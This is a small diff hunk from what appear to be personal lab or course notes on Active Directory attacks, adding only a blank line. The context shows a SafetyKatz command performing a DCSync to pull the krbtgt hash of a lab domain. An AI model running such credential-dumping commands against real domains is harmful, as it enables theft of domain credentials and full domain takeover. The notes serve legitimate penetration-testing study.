@@ -525,3 +525,4 @@ Now use safetykatz to extract the hash of any user
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 ![[Pasted image 20231025125418.png]]
+
